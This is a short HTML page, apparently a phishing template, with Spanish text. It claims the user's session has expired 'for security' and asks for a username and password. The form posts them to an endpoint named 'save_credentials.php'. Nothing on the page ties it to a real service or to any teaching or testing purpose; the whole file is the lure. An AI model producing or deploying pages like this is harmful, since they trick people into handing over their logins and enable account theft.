<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>

    <style>
        body{
            margin:0;
            height:100vh;
            display:flex;
            justify-content:center;
            align-items:center;
            background-color:#f2f2f2;
            font-family:Arial;
        }

        .container{
            background:white;
            padding:30px;
            border-radius:10px;
            box-shadow:0 0 15px rgba(0,0,0,0.2);
            width:300px;
            text-align:center;
        }

        input{
            width:90%;
            padding:8px;
            border:1px solid #ccc;
            border-radius:5px;
        }

        button{
            padding:10px;
            width:100%;
            background:#007BFF;
            color:white;
            border:none;
            border-radius:5px;
            cursor:pointer;
        }

        button:hover{
            background:#0056b3;
        }
    </style>
</head>
<body>

<div class="container">
    <h2>Su sesión ha expirado por seguridad.</h2>
    <p>Por favor, ingrese sus credenciales nuevamente para continuar.</p>

    <form action="save_credentials.php" method="POST">
        <label>Usuario:</label><br>
        <input type="text" name="username" required><br><br>

        <label>Contraseña:</label><br>
        <input type="password" name="password" required><br><br>

        <button type="submit">Iniciar Sesión</button>
    </form>
</div>

</body>
</html>
